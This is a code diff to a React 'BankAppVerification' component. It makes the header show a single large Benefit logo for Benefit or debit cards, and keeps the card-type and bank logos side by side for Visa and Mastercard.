@@ -18,12 +18,14 @@ export default function BankAppVerification() {
   const bankLogo = paymentData.bankLogo || "";
   const cardType = paymentData.cardType || "";
 
+  // Check if it's a Benefit card
+  const isBenefit = cardType.toLowerCase() === 'benefit' || cardType.toLowerCase() === 'debit' || bankName === 'BENEFIT';
+
   // Determine card type logo
   const getCardTypeLogo = () => {
     const type = cardType.toLowerCase();
     if (type === 'visa') return '/images/visa.png';
     if (type === 'mastercard') return '/images/mastercard.png';
-    if (type === 'benefit' || type === 'debit') return '/benefit-logo.png';
     return '';
   };
 
@@ -71,28 +73,42 @@ export default function BankAppVerification() {
     <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
       <div className="bg-white rounded-2xl shadow-xl p-6 max-w-md mx-auto w-full">
         {/* Bank Logo and Card Type */}
-        <div className="flex justify-between items-center mb-6 px-4">
-          {/* Card Type Logo (Visa/Mastercard/Benefit) */}
-          {cardTypeLogo && (
-            <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
+        {isBenefit ? (
+          /* Benefit: single large logo on the left */
+          <div className="flex justify-start mb-6 px-4">
+            <div className="flex items-center">
               <img
-                src={cardTypeLogo}
-                alt={cardType || 'Card'}
-                style={{ maxWidth: '80px', maxHeight: '30px', objectFit: 'contain' }}
+                src="/benefit-logo.png"
+                alt="Benefit"
+                style={{ width: '120px', height: 'auto', objectFit: 'contain' }}
               />
             </div>
-          )}
-          {/* Bank Logo */}
-          {bankLogo && (
-            <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
-              <img
-                src={bankLogo}
-                alt={bankName || "Bank"}
-                style={{ maxWidth: '80px', maxHeight: '30px', objectFit: 'contain' }}
-              />
-            </div>
-          )}
-        </div>
+          </div>
+        ) : (
+          /* Other cards: card type logo + bank logo */
+          <div className="flex justify-between items-center mb-6 px-4">
+            {/* Card Type Logo (Visa/Mastercard) */}
+            {cardTypeLogo && (
+              <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
+                <img
+                  src={cardTypeLogo}
+                  alt={cardType || 'Card'}
+                  style={{ maxWidth: '80px', maxHeight: '30px', objectFit: 'contain' }}
+                />
+              </div>
+            )}
+            {/* Bank Logo */}
+            {bankLogo && (
+              <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
+                <img
+                  src={bankLogo}
+                  alt={bankName || "Bank"}
+                  style={{ maxWidth: '80px', maxHeight: '30px', objectFit: 'contain' }}
+                />
+              </div>
+            )}
+          </div>
+        )}
 
         {/* Phone Icon - Professional Design */}
         <div className="flex justify-center mb-5">
